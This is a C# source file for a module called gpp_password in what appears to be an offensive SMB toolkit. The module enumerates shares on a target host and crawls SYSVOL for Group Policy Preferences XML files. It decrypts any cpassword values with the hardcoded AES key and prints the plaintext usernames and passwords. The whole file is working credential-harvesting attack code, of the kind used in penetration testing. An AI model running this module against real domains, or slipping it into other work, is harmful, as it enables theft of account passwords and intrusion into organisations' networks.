using System.Security.Cryptography;
using System.Text;
using System.Xml.Linq;
using Titanis;
using Titanis.DceRpc.Client;
using Titanis.Msrpc;
using Titanis.Msrpc.Mswkst;
using Titanis.Smb2;

namespace Atlas.Protocols.Smb.Modules;

/// <summary>
/// Covers Groups.xml, Services.xml, Scheduledtasks.xml, DataSources.xml, Printers.xml, Drives.xml.
/// </summary>
public sealed class GppPasswordModule : AtlasModule<Smb2Client>
{
	public override string Name => "gpp_password";
	public override string Description => "Retrieves and decrypts GPP cpasswords from SYSVOL (Groups/Services/ScheduledTasks/DataSources/Printers/Drives)";

	private static readonly byte[] GppAesKey = Convert.FromHexString("4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b");

	private static readonly string[] TargetFiles = new[]
	{
		"Groups.xml",
		"Services.xml",
		"Scheduledtasks.xml",
		"DataSources.xml",
		"Printers.xml",
		"Drives.xml"
	};

	public override async Task RunAsync(AtlasModuleContext<Smb2Client> ctx, CancellationToken cancellationToken)
	{
		RpcClient rpc = ctx.Services.CreateRpcClient();
		ServerServiceClient srvs = new ServerServiceClient();
		string pipe = srvs.WellKnownPipeName ?? "srvsvc";
		await rpc.ConnectPipe(srvs, ctx.Client, new UncPath(ctx.Host, Smb2Client.IpcName, pipe), cancellationToken).ConfigureAwait(false);

		IList<ShareInfo> shares;
		try
		{
			shares = await srvs.GetShares(@"\\" + ctx.Host, ShareInfoLevel.Level1, ServerServiceClient.DefaultReturnBufferSize, cancellationToken).ConfigureAwait(false);
		}
		catch
		{
			shares = await srvs.GetShares(@"\\" + ctx.Host, ShareInfoLevel.Level0, ServerServiceClient.DefaultReturnBufferSize, cancellationToken).ConfigureAwait(false);
		}

		var sysvol = shares.FirstOrDefault(s => string.Equals(s.ShareName, "SYSVOL", StringComparison.OrdinalIgnoreCase));
		if (sysvol is null)
		{
			AtlasConsole.Warn($"{ctx.Host}:445", "(gpp_password) SYSVOL not found or not readable");
			return;
		}

		AtlasConsole.Info($"{ctx.Host}:445", "(gpp_password) Found SYSVOL, searching for GPP XML files");
		List<string> gppPaths = new();
		// Crawl SYSVOL: typical path is <domain>/Policies/{GUID}/Machine|User/Preferences/...
		await SpiderSysvolAsync(ctx, "SYSVOL", gppPaths, cancellationToken).ConfigureAwait(false);

		if (gppPaths.Count == 0)
		{
			AtlasConsole.Info($"{ctx.Host}:445", "(gpp_password) No GPP XML files found");
			return;
		}

		int found = 0;
		foreach (var relPath in gppPaths)
		{
			cancellationToken.ThrowIfCancellationRequested();
			try
			{
				byte[] xmlBytes = await ReadFileAsync(ctx.Client, ctx.Host, "SYSVOL", relPath, cancellationToken).ConfigureAwait(false);
				string xmlText = Encoding.UTF8.GetString(xmlBytes);
				// Some GPP files are UTF-8 with BOM or UTF-16? Try UTF-8 first, fallback.
				if (xmlText.Length > 0 && xmlText[0] == '\uFEFF')
					xmlText = xmlText[1..];
				// If still not XML, try Unicode
				if (!xmlText.TrimStart().StartsWith("<"))
				{
					xmlText = Encoding.Unicode.GetString(xmlBytes);
					if (xmlText.Length > 0 && xmlText[0] == '\uFEFF')
						xmlText = xmlText[1..];
				}
				XDocument doc = XDocument.Parse(xmlText);
				var elementsWithCpassword = doc.Descendants().Where(e => e.Attribute("cpassword") != null);
				foreach (var el in elementsWithCpassword)
				{
					string? cpassword = el.Attribute("cpassword")?.Value;
					if (string.IsNullOrWhiteSpace(cpassword))
						continue;
					string password = DecryptCpassword(cpassword);
					// Try to find username-like attributes
					string username = string.Empty;
					foreach (var attr in new[] { "userName", "accountName", "runAs", "username", "newName" })
					{
						var val = el.Attribute(attr)?.Value ?? el.Parent?.Attribute(attr)?.Value;
						if (!string.IsNullOrEmpty(val)) { username = val; break; }
					}
					// Collect other props for context
					var otherProps = string.Join(", ", el.Attributes().Where(a => a.Name.LocalName != "cpassword").Select(a => $"{a.Name.LocalName}={a.Value}"));
					AtlasConsole.Success($"{ctx.Host}:445", $"(gpp_password) {relPath} -> user:{username} pass:{password} [{otherProps}]");
					found++;
				}
			}
			catch (Exception ex)
			{
				AtlasConsole.Warn($"{ctx.Host}:445", $"(gpp_password) failed to process {relPath}: {ex.Message}");
			}
		}
		AtlasConsole.Info($"{ctx.Host}:445", $"(gpp_password) {found} credential(s) recovered from {gppPaths.Count} file(s)");
	}

	private static string DecryptCpassword(string cpassword)
	{
		// Pad base64
		cpassword = cpassword.Trim();
		int mod = cpassword.Length % 4;
		if (mod != 0)
			cpassword += new string('=', 4 - mod);
		byte[] encrypted = Convert.FromBase64String(cpassword);
		using Aes aes = Aes.Create();
		aes.Key = GppAesKey;
		aes.IV = new byte[16];
		aes.Mode = CipherMode.CBC;
		aes.Padding = PaddingMode.PKCS7;
		using ICryptoTransform dec = aes.CreateDecryptor();
		byte[] decrypted = dec.TransformFinalBlock(encrypted, 0, encrypted.Length);
		// Decrypted is UTF-16LE
		string clear = Encoding.Unicode.GetString(decrypted);
		// Trim nulls and padding
		int nullIdx = clear.IndexOf('\0');
		if (nullIdx >= 0)
			clear = clear[..nullIdx];
		return clear.Trim();
	}

	private static async Task<byte[]> ReadFileAsync(Smb2Client smb, string host, string share, string relPath, CancellationToken ct)
	{
		await using Smb2FileStream stream = await smb.OpenFileReadAsync(new UncPath(host, share, relPath), ct).ConfigureAwait(false);
		using MemoryStream ms = new MemoryStream();
		await stream.CopyToAsync(ms, ct).ConfigureAwait(false);
		return ms.ToArray();
	}

	private async Task SpiderSysvolAsync(AtlasModuleContext<Smb2Client> ctx, string share, List<string> outPaths, CancellationToken ct)
	{
		var queue = new Queue<string>();
		queue.Enqueue(string.Empty);
		int depth = 0;
		const int maxDepth = 6;
		const int maxFiles = 500;
		int visited = 0;
		while (queue.Count > 0 && visited < maxFiles)
		{
			ct.ThrowIfCancellationRequested();
			string rel = queue.Dequeue();
			int level = rel.Count(c => c == '\\');
			if (level > maxDepth)
				continue;
			List<Smb2DirEntry> entries;
			try
			{
				await using Smb2Directory dir = await ctx.Client.OpenDirectoryAsync(new UncPath(ctx.Host, share, rel), ct).ConfigureAwait(false);
				entries = await dir.QueryDirAsync(ct).ConfigureAwait(false);
			}
			catch
			{
				continue;
			}
			foreach (var e in entries)
			{
				if (e.FileName is "." or "..")
					continue;
				string child = rel.Length == 0 ? e.FileName : $"{rel}\\{e.FileName}";
				if (!e.IsDirectory)
				{
					if (TargetFiles.Any(tf => e.FileName.Equals(tf, StringComparison.OrdinalIgnoreCase)))
					{
						outPaths.Add(child);
						AtlasConsole.Info($"{ctx.Host}:445", $"(gpp_password) Found {share}\\{child}");
					}
				}
				else if (!e.IsReparsePoint && level < maxDepth)
				{
					queue.Enqueue(child);
				}
				visited++;
				if (visited >= maxFiles) break;
			}
		}
	}
}
